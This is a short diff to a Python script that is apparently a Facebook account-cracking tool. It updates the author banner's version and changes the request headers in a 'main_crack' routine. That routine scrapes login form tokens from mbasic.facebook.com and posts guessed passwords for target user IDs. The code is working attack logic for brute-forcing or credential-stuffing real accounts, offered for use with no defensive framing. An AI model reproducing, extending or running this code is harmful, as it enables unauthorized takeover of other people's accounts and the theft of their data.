@@ -89,7 +89,7 @@ logo =                                          """
 \033[1;37m Owner   :            Muhammad Suhbat
 \033[1;37m Facebook:            Muhammad Suhbat
 \033[1;37m Github  :            Suhbat-Ssn
-\033[1;37m Version :            S1.1
+\033[1;37m Version :            S1.2
 \033[1;37m------------------------------------------------ """
 def clear():
     os.system("clear")
@@ -413,8 +413,8 @@ class main_crack():
                 getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                 idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                 session.headers = {}
-                headers= {'authority': 'developer.facebook.com',
-                'method': 'POST',
+                headers= {"authority": 'mbasic.facebook.com',
+                'method': 'GET',
                 'scheme': 'https',
                 'x-fb-rlafr': '0',
                 'access-control-allow-origin': '*',
